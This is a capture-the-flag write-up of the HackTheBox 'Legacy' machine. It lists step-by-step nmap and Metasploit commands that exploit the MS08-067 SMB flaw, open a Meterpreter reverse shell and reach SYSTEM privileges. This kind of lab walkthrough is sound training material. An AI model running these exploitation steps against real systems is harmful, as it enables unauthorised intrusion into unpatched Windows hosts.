With the victim IP already in hand we begin the process by running a network mapping tool called NMAP. 
The command I like to use is ```nmap -T4 -p- -A 10.10.10.4```

```-T4``` specifies the speed at which we run the scan, the ```-p-``` option scans all 65535 ports, and the ```-A``` enables OS detection, version detection, script scanning, and traceroute.

![nmap-scan-results](/assets/img/legacy/legacy-nmap.png)

The scan returns 3 ports. Port 3389 is the designated port for Windows Remote Desktop Protocol. As the port is closed we won't be attacking it, however ports 139 & 445 are open. These both pertain to the SMB File sharing protocol.

As our NMAP scan didn't return an SMB version we fire up Metasploit using the ```msfconsole``` command. In Metasploit we ```search smb_version``` for a module that will allow us to ascertain the version. We then use the module with this command ```use auxiliaryscanner/smb/smb_version```. With the SMB version we'll be better equipped to find a suitable exploit.

![msfconsole-smb_version-module](/assets/img/legacy/smb-version.png)

We run ```options``` to see what we need to configure. The ```THREADS``` option has already been set, so we just need to assign the ```RHOSTS``` option with the IP of the victim machine. We set it with this command ```set RHOSTS 10.10.10.4```.

![smb_version-options](/assets/img/legacy/smb-options.png)

We ```run``` the module which returns the SMB version - ```Windows XP SP3```.

![smb_version](/assets/img/legacy/smb-version2.png)

With this information we go to a browser and search for "smb Windows XP SP3 exploit". Typically the two resources we want to go for are "www.exploit-db.com" & "www.rapid7.com". 

One of the top results should be "www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/". This will contain a suitable exploit for us to attack with, and contains the steps and options in order for us to carry out the exploit.

![rapid7- options](/assets/img/legacy/rapid7.png)

We return to our terminal and follow the steps outlined on Rapid7. In Metasploit we enter ```use exploit/windows/smb/ms08_067_netapi``` No payload had been configured so the payload defaults to ```windows/meterpreter/reverse_tcp```.

We then take a look at our options for the exploit. We see that all we are required to set is the ```RHOSTS``` option, however
as we're attempting this via HackTheBox's VPN config, our ```LHOST``` is set using the wrong network interface IP. We need to change it to the ```tun0``` IP that is our network interface into HTB.

![use-exploit](/assets/img/legacy/leg-exploit-ms08.png)

 We use ```ip a``` in a new terminal window to find our ```tun0``` IP and enter ```set RHOSTS 10.10.10.4``` and (in my case) ```set LHOST 10.10.16.3```.

 ![use-exploit](/assets/img/legacy/set-rhosts-lhost.png)

 At this stage we're ready run our exploit, we can do this with either the ```run``` or ```exploit``` command. And as simple as that we have ourselves a reverse shell. From here want to know what user level we are, so we run ```getuid``` and see that we are ```AUTHORITY/SYSTEM```.
We have the highest level of privileges, the system has been owned!

 Navigate to ‘Document and Settings\Users\john\Desktop\user.txt’ and 'Document and Settings\Users\Administrator\Desktop\root.txt’
respectively to locate your flags and fully own the system.
